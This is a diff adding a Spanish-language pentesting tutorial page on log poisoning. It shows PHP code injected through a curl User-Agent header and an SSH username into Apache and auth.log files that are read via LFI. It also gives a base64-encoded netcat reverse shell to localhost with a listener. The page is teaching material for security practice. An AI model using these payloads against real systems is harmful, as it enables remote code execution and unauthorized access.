@@ -1,0 +1,60 @@
+---
+title: 'Log Poisoning'
+publishedAt: '2024-11-18'
+group: 'tecnicas_pentesting'
+groupOrder: 2
+---
+
+# Log Poisoning
+
+Se trata de ejecutar comandos que luego se vayan a ver en los logs.
+
+Por ejemplo, si accedemos a /var/log/https/access_log podemos ver todos los logs de lo que se ha ido ejecutando en apache
+
+![Captura del cat de /var/log/https/access_log](/images/log-poisoning-1.png)
+
+También puede ser /var/log/apache/access.log
+
+Si encontramos la vulnerabilidad del LFI, podemos ver los logs directamente en la página (poniendo la ruta del archivo)
+
+![Captura del LFI en la web de /var/log/https/access_log](/images/log-poisoning-2.png)
+
+Como una de las cosas que se listan en estos logs es el user agent de las peticiones que hacemos y nosotros podemos definir cuál es el user agent, podemos hacer una petición con curl que ejecute código para luego poder ver el resultado en los logs.
+
+```bash
+curl -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.php"
+```
+
+Y como resultado nos devolveria el fichero de logs www-data en lugar del user agent
+
+Otro ejemplo de logs es /var/log/auth.log que contiene a todos los usuarios que se intentan autenticar en el sistema
+
+Ejecutando
+
+```
+ssh usuariodeprueba@127.0.0.1
+```
+
+con cualquier contraseña (ya que no existe el usuario y no se va a poder acceder) y podremos ver el intento de autenticación en /var/log/auth.log
+
+Para explotar esto, podemos intentar ejecutar comandos en el campo del usuario haciendo
+
+```bash
+ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash"); ?>'@127.0.0.1
+```
+
+Donde bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK es el resultado de ejecutar en consola
+
+```bash
+echo "nc -e /bin/bash 127.0.0.1 443" | base64; echo
+```
+
+Que lo que hace es ejecutar bash en el puerto 443 de la ip que le pasamos (que en este caso es localhost porque estamos haciendo pruebas en local)
+
+Mientras tanto, tenemos ejecutado en otra consola
+
+```bash
+nc -nlvp 443
+```
+
+para estar escuchando en el puerto 443 y ganar acceso con el reverse shell.
